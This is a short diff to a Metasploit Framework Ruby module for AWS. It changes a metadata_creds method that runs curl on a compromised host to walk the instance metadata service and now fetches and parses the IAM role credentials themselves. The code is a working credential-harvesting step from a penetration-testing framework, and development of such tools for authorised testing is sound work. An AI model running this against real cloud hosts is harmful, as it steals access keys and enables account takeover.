@@ -7,16 +7,21 @@ module Metasploit
   module Framework
     module Aws
       module Client
+        include Msf::Exploit::Remote::HttpClient
+        def register_autofilter_ports(ports=[]); end
+        def register_autofilter_hosts(ports=[]); end
+        def register_autofilter_services(services=[]); end
+
         def metadata_creds
           if cmd_exec("curl --version") =~ /^curl \d/
             url = "http://#{datastore['RHOST']}/2012-01-12/meta-data/"
             print_status("#{peer} - looking for creds...")
             resp = cmd_exec("curl #{url}")
-            if resp =~ /^iam$/
+            if resp =~ /^iam.*/
               resp = cmd_exec("curl #{url}iam/")
-              if resp =~ /^security-credentials$/
+              if resp =~ /^security-credentials.*/
                 resp = cmd_exec("curl #{url}iam/security-credentials/")
-                return JSON.parse(resp)
+                return JSON.parse(cmd_exec("curl #{url}iam/security-credentials/#{resp}"))
               end
             end
           end
